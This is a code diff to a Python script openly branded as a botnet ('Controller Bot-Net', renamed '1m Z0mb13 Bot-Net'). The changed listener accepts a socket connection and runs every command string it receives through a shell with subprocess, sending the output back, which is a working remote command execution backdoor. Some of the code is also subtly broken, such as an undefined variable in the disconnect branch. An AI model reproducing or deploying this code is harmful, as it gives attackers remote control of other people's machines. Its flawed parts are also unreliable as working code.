@@ -19,7 +19,9 @@ class Controller(object):
             time.sleep(2. / 100)
         time.sleep(1.5)
         print('-----------------------------------------------------------------')
-        print(Fore.WHITE + '[' + Fore.GREEN + '+' + Fore.WHITE + ']Made By AL104 & Droid | Github:https://github.com/abalesluke')
+        print(Fore.WHITE + '[' + Fore.GREEN + '+' + Fore.WHITE + ']Made By AL104 & Droid')
+        print("Github:https://github.com/FonderElite")
+        print("Github:https://github.com/abalesluke")
         print('-----------------------------------------------------------------')
         time.sleep(1.5)
 
@@ -37,13 +39,23 @@ class Controller(object):
         print(f"Listening as {server_ip}:{server_port}...")
         client_socket, client_address = s.accept()
         print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}][{client_address[0]}:{client_address[1]} Connected!")
-        time.sleep(1.5)
-        print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]You may now proceed executing commands in the controller.")
         try:
             host = socket.gethostname()
             while True:
-                cwd = client_socket.recv(buffer_size).decode()
-                arbitrary_cmd_exec = os.system(cwd)
+                cmd = client_socket.recv(1024).decode()
+                if cmd == 'gg':
+                    client_socket.send(f'connection closed from {ip}'.encode())
+                    client_socket.close()
+                    break
+                elif cmd == 'close':
+                    print(f'connection closed from {client_address}')
+                    client_socket.close()
+                    break
+
+                else:
+                    cmd = subprocess.Popen(cmd, shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
+                    client_socket.send(cmd.stdout.read())
+                    client_socket.send(cmd.stderr.read())
         except Exception:
             print('\nUsage for help: python3 <file-name.py> -h ')
 if __name__ == "__main__":
@@ -51,7 +63,7 @@ if __name__ == "__main__":
     banner = Process(target=main_class.show_banner,args=('''
      _,-ddd888888bbb-._
    d88888888888888888888b     ------------------
- d888888888888888888888888b   Controller Bot-Net 
+ d888888888888888888888888b    1m Z0mb13 Bot-Net 
 6888888888888888888888888889  ------------------
 68888b8""8q8888888p8""8d88889 
 `d8887     p88888q     4888b'
@@ -63,8 +75,7 @@ if __name__ == "__main__":
            `d8888b' `
              `bd'
     ''',)) 
-    listener = Process(target=main_class.listen)
     banner.start()
     banner.join()
-    listener.start()
-    listener.join()
+    while True:
+        main_class.listen()
